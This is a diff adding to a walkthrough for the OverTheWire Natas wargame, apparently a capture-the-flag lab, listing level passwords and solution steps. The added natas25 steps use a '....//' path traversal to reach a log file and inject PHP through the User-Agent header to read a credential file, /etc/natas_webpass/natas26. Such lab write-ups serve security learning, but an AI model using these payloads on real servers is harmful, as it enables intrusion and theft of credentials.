@@ -140,3 +140,9 @@ natas24 -> MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd:
 	Open URL: "http://natas24.natas.labs.overthewire.org/?passwd[]="
 
 natas25 -> ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws:
+	Get current session cookie
+	Open URL: "http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_[session cookie here].log"
+	Intercept get request and change User-Agent to: 
+		<?php print file_get_contents('/etc/natas_webpass/natas26'); ?>
+	
+natas26 -> cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE:
